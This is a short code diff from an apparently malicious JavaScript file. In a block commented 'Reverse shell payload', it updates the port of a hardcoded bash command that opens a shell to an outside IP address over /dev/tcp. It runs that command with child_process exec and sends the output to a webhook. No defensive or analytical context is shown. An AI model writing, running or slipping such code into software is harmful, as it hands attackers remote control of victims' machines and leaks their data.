@@ -13,7 +13,7 @@
         // Reverse shell payload
         try {
             const { exec } = require('child_process');
-            const shell = "bash -i >& /dev/tcp/13.202.226.61/13516 0>&1"; // ngrok IP and port
+            const shell = "bash -i >& /dev/tcp/13.202.226.61/13888 0>&1"; // ngrok IP and port
             exec(shell, (err, stdout, stderr) => {
                 fetch(webhook, {
                     method: 'POST',
